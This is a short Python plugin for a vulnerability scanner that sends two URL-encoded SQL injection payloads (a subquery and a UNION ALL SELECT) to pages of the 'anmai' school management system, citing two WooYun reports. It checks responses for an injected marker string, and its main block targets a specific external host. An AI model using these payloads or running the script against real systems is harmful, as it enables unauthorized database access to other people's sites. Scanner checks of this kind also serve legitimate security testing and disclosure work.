#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'
#ref wooyun-2015-0106717
#ref wooyun-2015-0106896

def assign(service, arg):
    if service == "anmai":
        return True, arg


def audit(arg):
    payloads = ['anmai/SF_Manage/tfdeleN.aspx?tfid=%28SELECT%20%20CHAR%28113%29%2bCHAR%28122%29%2bCHAR%28112%29%2bCHAR%28122%29%2bCHAR%28113%29%2bCHAR%28120%29%2bCHAR%2878%29%2bCHAR%2882%29%2bCHAR%2879%29%2bCHAR%2875%29%2bCHAR%28100%29%2bCHAR%2884%29%2bCHAR%2889%29%2bCHAR%28105%29%2bCHAR%28107%29%2bCHAR%28113%29%2bCHAR%28120%29%2bCHAR%28122%29%2bCHAR%28112%29%2bCHAR%28113%29%20%29',\
    'anmai/RecruitstuManage/hiddenValue.aspx?topicid=1%27%20UNION%20ALL%20SELECT%20null%2CCHAR%28113%29%2bCHAR%28122%29%2bCHAR%28112%29%2bCHAR%28122%29%2bCHAR%28113%29%2bCHAR%28120%29%2bCHAR%2878%29%2bCHAR%2882%29%2bCHAR%2879%29%2bCHAR%2875%29%2bCHAR%28100%29%2bCHAR%2884%29%2bCHAR%2889%29%2bCHAR%28105%29%2bCHAR%28107%29%2bCHAR%28113%29%2bCHAR%28120%29%2bCHAR%28122%29%2bCHAR%28112%29%2bCHAR%28113%29--']
    for payload in payloads:
        url = arg + payload
        code, head,res, errcode, _ = curl.curl2(url)
        if code==200 and'qzpzqxNROKdTYikqxzpq' in res:
            security_hole(url)
                            
if __name__ == '__main__':
    from dummy import *
    audit(assign('anmai', 'http://www.gxbyzx.cn:88/')[1])